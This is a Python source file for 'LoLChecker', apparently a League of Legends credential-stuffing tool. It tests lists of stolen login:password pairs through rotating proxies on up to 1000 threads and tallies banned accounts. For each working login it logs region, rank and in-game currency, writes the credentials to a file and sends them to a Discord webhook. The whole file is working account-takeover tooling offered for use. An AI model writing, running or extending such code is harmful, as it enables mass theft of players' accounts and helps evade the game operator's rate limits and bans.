from codeparts import auth,checkers,systems
import traceback
import os
import ctypes
from colorama import Fore,Style
import discord_webhook
import datetime
import threading
import time

check=checkers.checkers()
sys=systems.system()

class Checker:
    def __init__(self,settings:list,accounts,count) -> None:
        self.accounts=accounts
        self.webhook=settings['webhook']
        self.err=0
        self.count=count
        self.valid=0
        self.checked=0
        self.banned=0
        self.bad=[0,1,3,4]
        self.regions={
            "BR": 0,
            "EUN": 0,
            "EUW": 0,
            "JP": 0,
            "LA": 0,
            "NA": 0,
            "OC": 0,
            "RU": 0,
            "TR": 0,
            'unknown':0
        }

        self.rpgift=0

        self.ranks={
            'unranked':0,
            "iron":0,
            "bronze":0,
            "silver":0,
            "gold":0,
            "platinum":0,
            "diamond":0,
            "master":0,
            "grandmaster":0,
            "challenger":0
        }

    def main(self):
        self.proxylist=sys.load_proxy()
        os.system(f'mode con: cols=60 lines=40')
        self.threadam=int(input('input number if threads (min 1 max 1000) >>>'))
        num=0
        self.printinfo()
        if self.threadam==1:
            for account in self.accounts:
                us=account.split(':')[0]
                ps=account.split(':')[1]
                self.checker(us,ps)
            return
        while True:
            if threading.active_count() <= self.threadam:
                if len(self.accounts)>num:
                    try:
                        us=self.accounts[num].split(':')[0]
                        ps=self.accounts[num].split(':')[1]
                    
                        threading.Thread(target=self.checker,args=(us,ps)).start()
                        #self.printinfo()
                        num+=1
                    except:
                        print("Checked all")

    def checker(self,login,password) -> None:
        proxy=sys.getproxy(self.proxylist)
        account=f'{login}:{password}'
        try:
            ath=auth.auth(login,password)
            token,ent,puuid,unverifmail=ath.auth(proxy)
            if token in self.bad:
                if token==4:
                    self.banned+=1
                self.checked+=1
                self.printinfo()
                return
            elif token==9:
                print(f'RATE LIMIT OH FUCK')
                time.sleep(30)
            region,level,regionid=ath.get_region(token,proxy)
            try:
                self.regions[region]+=1
            except:
                self.regions['unknown']+=1
                region='N/A'
            if region != 'N/A':
                rank=check.getrank(regionid,token)
                #input(rank)
                try:
                    self.ranks[rank.lower()] +=1
                except:
                    pass
                #inventory=check.get_inventory(token,puuid,regionid)
                rp,be=check.balance(token,regionid)
            else:
                rp,be='N/A','N/A'
            if rp != 'N/A':
                if int(rp)>=125:
                    self.rpgift+=1
            self.valid+=1
            with open (f'output\\valid.txt', 'a', encoding='UTF-8') as file:
                file.write(f'''
|[{account}]
|region: {region}
|level: {level}
|rank: {rank}
|rp, blue essence: {rp}, {be}
###account###\n''')

            #inventory=check.get_inventory(self.user_info,self.region_id,login,token)
            #print(inventory)
            if region!='N/A' and self.webhook!='':
                from discord_webhook import DiscordWebhook, DiscordEmbed
                dcwebhook = DiscordWebhook(url=self.webhook)
                embed = DiscordEmbed(title='New valid account', color='34eb43')
                embed.set_author(name='lolkeker')
                embed.set_timestamp()
                embed.add_embed_field(name='LogPass', value=account)
                embed.add_embed_field(name='Region', value=region)
                embed.add_embed_field(name='Rank', value=rank)
                embed.add_embed_field(name='Level', value=level)
                embed.add_embed_field(name=f'RP / BE', value=f'{rp} / {be}')
                dcwebhook.add_embed(embed)
                response=dcwebhook.execute()
                self.printinfo()
                return
        except Exception as e:
            with open('log.txt','a') as f:
                f.write(f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
            self.err+=1
            #print(e)
        self.checked+=1

    def printinfo(self):
        ctypes.windll.kernel32.SetConsoleTitleW(f'LoLChecker by liljaba1337 | Checked {self.checked}/{self.count}')
        os.system('cls')
        print(f'''
    {sys.center('https://github.com/LIL-JABA/lolchecker')}
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   checked              >[{Fore.YELLOW}{self.checked}/{self.count}{Style.RESET_ALL}]<
    >                   valid                >[{Fore.GREEN}{self.valid}{Style.RESET_ALL}]<
    >                   banned               >[{Fore.LIGHTRED_EX}{self.banned}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   125+ rp              >[{Fore.GREEN}{self.rpgift}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   BR                   >[{Fore.CYAN}{self.regions['BR']}{Style.RESET_ALL}]<
    >                   EUN                  >[{Fore.CYAN}{self.regions['EUN']}{Style.RESET_ALL}]<
    >                   EUW                  >[{Fore.CYAN}{self.regions['EUW']}{Style.RESET_ALL}]<
    >                   JP                   >[{Fore.CYAN}{self.regions['JP']}{Style.RESET_ALL}]<
    >                   LA                   >[{Fore.CYAN}{self.regions['LA']}{Style.RESET_ALL}]<
    >                   NA                   >[{Fore.CYAN}{self.regions['NA']}{Style.RESET_ALL}]<
    >                   OC                   >[{Fore.CYAN}{self.regions['OC']}{Style.RESET_ALL}]<
    >                   RU                   >[{Fore.CYAN}{self.regions['RU']}{Style.RESET_ALL}]<
    >                   TR                   >[{Fore.CYAN}{self.regions['TR']}{Style.RESET_ALL}]<
    >                   UNKNOWN              >[{Fore.CYAN}{self.regions['unknown']}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   unranked             >[{Fore.CYAN}{self.ranks['unranked']}{Style.RESET_ALL}]<
    >                   iron                 >[{Fore.CYAN}{self.ranks['iron']}{Style.RESET_ALL}]<
    >                   bronze               >[{Fore.CYAN}{self.ranks['bronze']}{Style.RESET_ALL}]<
    >                   silver               >[{Fore.CYAN}{self.ranks['silver']}{Style.RESET_ALL}]<
    >                   gold                 >[{Fore.CYAN}{self.ranks['gold']}{Style.RESET_ALL}]<
    >                   platinum             >[{Fore.CYAN}{self.ranks['platinum']}{Style.RESET_ALL}]<
    >                   diamond              >[{Fore.CYAN}{self.ranks['diamond']}{Style.RESET_ALL}]<
    >                   master               >[{Fore.CYAN}{self.ranks['master']}{Style.RESET_ALL}]<
    >                   grandmaster          >[{Fore.CYAN}{self.ranks['grandmaster']}{Style.RESET_ALL}]<
    >                   challenger           >[{Fore.CYAN}{self.ranks['challenger']}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   errors               >[{Fore.LIGHTRED_EX}{self.err}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            ''')